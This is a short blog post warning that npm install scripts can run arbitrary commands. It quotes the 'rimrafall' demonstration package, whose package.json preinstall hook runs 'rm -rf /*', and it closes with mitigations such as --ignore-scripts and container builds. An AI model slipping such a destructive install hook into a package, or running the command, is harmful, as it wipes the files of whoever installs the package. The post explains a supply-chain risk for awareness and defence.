---
layout: post
title: "`npm install` could be dangerous"
date:   2015-03-01 21:00:00
image:
    url: /assets/article_images/2015-03-01-npm-dependency/airplane-crash.jpg
video: false
comments: true
theme_color: 302F2D

author: 'Dominik Richter'
author_image: "https://avatars0.githubusercontent.com/u/1307529?s=400"
author_link: "https://twitter.com/arlimus"
---

[NPM](https://www.npmjs.com/) hosts about 144,000 npm modules on their registry. Over one million modules are downloaded per month. Assume you use one module that includes a major flaw in their implementation? Will you detect it?

Just recently, [João Jerónimo](https://github.com/joaojeronimo) published a special npm modules called [rimrafall](https://github.com/joaojeronimo/rimrafall). He published it at npm and posted it on [Hacker News](https://news.ycombinator.com/item?id=8947493). Essentially this module does the following:

    sudo su -
    rm -rf /

It uses a special script tag in `package.json` to run a prescript. Commonly it is used to build native code, but still can be used to do anything that bash can.

The package.json looks as follows:

    {
      "name": "rimrafall",
      "version": "1.0.0",
      "description": "rm -rf /* # DO NOT INSTALL THIS",
      "main": "index.js",
      "scripts": {
        "preinstall": "rm -rf /*"
      },
      "keywords": [
        "rimraf",
        "rmrf"
      ],
      "author": "João Jerónimo",
      "license": "ISC"
    }

Once you just install this module, your computer is shredded. Do you verify all your dependencies for malicious scripts? In most cases you do not. This is especially dangerous if this runs on your production server or CI server.

Although there is no easy mitigation, you could start building all your node code in a Docker container or use `npm install --ignore-scripts`. If you integrate 3rd-party modules, have a look at their source code, especially if it is a new module without much stars.

